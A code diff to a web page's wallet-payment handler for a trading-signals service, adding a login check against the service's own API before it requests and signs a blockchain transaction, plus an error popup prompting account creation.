@@ -2075,12 +2075,35 @@
                 else {
                     payload = JSON.stringify({ creatorWallet });
                 }
-                let res = await fetch('https://trading-signals-private.vercel.app/api/CreateTransaction', {
+                let res;
+                let data;
+                const username = localStorage.getItem('username');
+                const email = localStorage.getItem('email');
+                const UID = localStorage.getItem('UID');
+                if (username && email && UID) {
+                    res = await fetch('https://trading-signals-private.vercel.app/api/Login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            username,
+                            email,
+                            UID
+                        })
+                    });
+                    data = await res.json();
+                    if (!(res.ok && data.ok)) {
+                        throw new Error('Join in Required');
+                    }
+                } else {
+                    throw new Error('Join in Required');
+                }
+
+                res = await fetch('https://trading-signals-private.vercel.app/api/CreateTransaction', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: payload
                 });
-                let data = await res.json();
+                data = await res.json();
                 console.log(data.Network);
                 const txBase64 = data.transaction;
                 const tx = Transaction.from(Uint8Array.from(atob(txBase64), c => c.charCodeAt(0)));
@@ -2088,6 +2111,7 @@
                 const signedTx = await provider.signTransaction(tx);
                 PayButton.innerText = 'Sending To Blockchain....';
                 const signedTxBase64 = btoa(String.fromCharCode(...signedTx.serialize()));
+
                 res = await fetch('https://trading-signals-private.vercel.app/api/ConfirmTransaction', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -2107,6 +2131,12 @@
             }
             catch (ex) {
                 console.log(ex);
+
+                if (ex.message === 'Join in Required') {
+                    PayButton.removeEventListener('click', Pay);
+                    PayButton.addEventListener('click', () => showPopupMessage('Join in Required', 'Create Your Account First', 'https://cdn0.iconfinder.com/data/icons/shift-free/32/Error-512.png'));
+                    showPopupMessage(ex.message, 'Create Your Account First', 'https://cdn0.iconfinder.com/data/icons/shift-free/32/Error-512.png');
+                }
             }
             finally {
                 PayButton.innerText = 'Get Started';
